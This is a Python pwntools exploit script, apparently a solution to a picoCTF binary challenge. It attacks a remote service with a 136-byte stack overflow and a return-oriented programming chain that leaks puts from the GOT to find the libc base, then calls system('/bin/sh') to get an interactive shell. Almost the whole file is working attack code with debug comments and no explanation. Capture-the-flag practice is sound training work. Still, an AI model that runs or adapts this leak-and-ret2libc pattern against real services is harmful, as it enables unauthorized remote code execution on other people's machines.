from pwn import *

# p=process("./vuln_patched")
p=remote("mercury.picoctf.net", 23584)

print(p.recvline()) # stdout: WeLcOmE To mY EcHo sErVeR!

elf=ELF("./vuln_patched")
libc=ELF("./libc.so.6")

payload=b"A"*136
payload+=p64(0x00400913) # pop rdi
payload+=p64(elf.got['puts'])
payload+=p64(elf.plt['puts'])
payload+=p64(elf.symbols['main'])
p.sendline(payload)
print("--- sent payload ---")

print(p.recvline()) # e.g. stdout: BbBbBbBbBbBbBbBbBb when you input stdin: BBBBBBBBBBBBBBBBBB.

## debug
# res = p.recvline()     
# print(res)           # b'0JvX\xa4\x7f\n'
# print(len(res))      # 7

res = p.recv(6)
## debug
# print(res)
# print(res.ljust(8,b"\x00"))
# print(u64(res.ljust(8,b"\x00")))
# # print("debug" + u64(res.ljust(8,b"\x00"))) # error: str + byte
# print("debug : " + hex(u64(res.ljust(8,b"\x00")))) # 0x7f04c57e9a30
addr = u64(res.ljust(8,b"\00"))
print("debug : " + hex(addr))

libc_base=addr-libc.symbols['puts'] # libc.symbols['puts'] ... 0x80a30 from readelf
print("debug : " + hex(libc_base))  # 0x7fda9a521000 when addr is 0x7fda9a5a1a30

payload=b"A"*136
payload+=p64(0x0040052e) # ret ... Align the stack to 16 bytes otherwise system() will crash
payload+=p64(0x00400913) # pop rdi
payload+=p64(libc_base+next(libc.search(b"/bin/sh")))
# payload+=p64(0x0040052e) # ret, this also workes well for Stack Alignment
payload+=p64(libc_base+libc.symbols['system'])
p.sendline(payload)
print("--- sent payload ---")

p.interactive()